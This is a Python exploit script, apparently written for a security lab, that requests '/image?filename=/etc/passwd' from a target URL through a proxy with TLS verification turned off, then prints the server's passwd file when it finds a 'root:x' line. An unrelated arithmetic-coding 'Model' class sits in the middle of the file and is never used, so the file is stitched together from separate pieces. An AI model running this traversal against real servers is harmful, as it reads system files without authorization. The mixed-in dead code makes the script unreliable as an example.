import sys
import requests
import urllib3
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT"),
    'https': "https://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT")
}

request_exploit = '/image?filename=/etc/passwd'


def directory_traversal_exploit(url):
    image_url = url + request_exploit
    r = requests.get(image_url, verify=False, proxies=proxies)
    if 'root:x' in r.text:
        print("(-> Exploit successful!")
        print("(-> The following is the content of the /etc/passwd file:")
        print(r.text)
    else:
        print('(-) Exploit failed.')
        sys.exit(-1)

class Model:
    def __init__(self):
        # Initialize your model here
        self.characters = {}
        # Example initialization
        self.characters = {0: {"count": 10}, 1: {"count": 20}, 2: {"count": 15}, 3: {"count": 5}, 4: {"count": 10}}

    def get_count(self):
        # Calculate the total count of all symbols in your model
        return sum(symbol["count"] for symbol in self.characters.values())

    def get_char(self, count):
        # Find the symbol corresponding to the given count
        cumulative_count = 0
        for char, info in self.characters.items():
            cumulative_count += info["count"]
            if count < cumulative_count:
                return char, info
        # If count exceeds the total count, return a special end-of-stream symbol
        return 256, {"low": 0, "high": 0, "count": 1}

# Example usage
m_model = Model()

def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(-> Exploiting file path traversal ...")
    directory_traversal_exploit(url)


if __name__ == "__main__":
    main()
